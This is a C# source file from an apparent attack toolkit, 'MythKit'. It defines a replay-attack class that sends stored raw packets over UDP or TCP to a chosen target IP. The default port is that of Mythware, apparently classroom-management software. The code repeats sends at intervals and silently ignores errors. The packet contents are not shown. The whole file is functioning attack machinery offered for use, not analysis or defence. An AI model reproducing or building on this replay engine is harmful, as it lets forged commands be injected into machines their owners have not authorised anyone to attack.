using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Threading.Tasks;

namespace MythKit.Pages.ReplayAttack
{
    public enum AttackProtocolType
    {
        UDP,
        TCP
    }
    public class AttackPacket
    {
        public List<byte[]> AttackPackets;
        public int TargetPort;
        public int IntervalMiliseconds;
        public AttackProtocolType protocolType = AttackProtocolType.UDP;
        public AttackPacket(List<byte[]> attackPackets, int targetPort = -1, int intervalMiliseconds = 0, AttackProtocolType protocolType = AttackProtocolType.UDP)
        {
            if (targetPort == -1)
            {
                targetPort = AttackIndex.MythwareDefaultPort;
            }
            AttackPackets = attackPackets;
            TargetPort = targetPort;
            IntervalMiliseconds = intervalMiliseconds;
            this.protocolType = protocolType;
        }
        public static string FormatString(string str, string ip, int cycleCount, int groupCount)
        {
            return str.Replace("${ip}", ip).Replace("${cycle}", cycleCount.ToString()).Replace("${group}", groupCount.ToString());
        }
        public async Task SendToTarget(IPAddress target, CancellationToken cancellationToken)
        {
            for (int packetCount = 0; packetCount < AttackPackets.Count; packetCount++)
            {
                var packet = AttackPackets[packetCount];
                try
                {
                    if (protocolType == AttackProtocolType.UDP)
                    {
                        using (var udpClient = new UdpClient())
                        {
                            udpClient.Send(packet, packet.Length, target.ToString(), TargetPort);
                        }
                    }
                    else if (protocolType == AttackProtocolType.TCP)
                    {
                        using (var tcpClient = new TcpClient())
                        {
                            tcpClient.Connect(target, TargetPort);
                            using (var networkStream = tcpClient.GetStream())
                            {
                                networkStream.Write(packet, 0, packet.Length);
                            }
                        }
                    }
                }
                catch { }
                if (IntervalMiliseconds > 0 && packetCount == AttackPackets.Count - 1)
                {
                    await Task.Delay(IntervalMiliseconds, cancellationToken);
                }
            }
        }
    }
}
